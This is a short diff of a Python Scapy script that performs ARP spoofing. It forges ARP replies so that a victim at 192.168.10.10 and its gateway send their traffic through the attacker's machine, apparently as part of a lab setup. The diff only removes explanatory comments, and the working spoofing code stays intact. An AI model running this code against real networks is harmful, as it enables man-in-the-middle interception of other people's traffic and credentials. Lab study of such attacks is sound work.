@@ -10,12 +10,11 @@ import time
 import os
 from scapy.all import Ether, ARP, sendp, get_if_hwaddr
 
-# --- Configuration (Matches setup_lab.sh and your discovered MACs) ---
+# --- Configuration (Matches setup_lab.sh and MACs) ---
 VICTIM_IP = "192.168.10.10"
 GATEWAY_IP = "192.168.10.1"
 INTERFACE_TOWARDS_VICTIM = 'eth0' 
 
-# !!! HARDCODED MAC ADDRESSES from your previous steps !!!
 VICTIM_MAC = "02:ac:70:dc:d9:3b"
 GATEWAY_MAC = "2a:ef:96:ce:7b:d7"
 
@@ -27,13 +26,13 @@ def arp_spoof(target_ip, spoof_ip, target_mac):
     # Layer 2: Ethernet. Source is Attacker MAC, Destination is Target MAC.
     eth_layer = Ether(src=ATTACKER_MAC, dst=target_mac)
     
-    # Layer 3: ARP. op=2 means 'is-at' (reply)
+    # Layer 3: ARP. 
     arp_layer = ARP(
         op=2,
-        psrc=spoof_ip,      # The IP we are pretending to be (Victim or Gateway)
-        pdst=target_ip,     # The IP of the actual target (Victim or Gateway)
-        hwsrc=ATTACKER_MAC, # The MAC address that should receive future packets
-        hwdst=target_mac    # Target's real MAC
+        psrc=spoof_ip,      
+        pdst=target_ip,     
+        hwsrc=ATTACKER_MAC, 
+        hwdst=target_mac    
     )
     
     packet = eth_layer / arp_layer
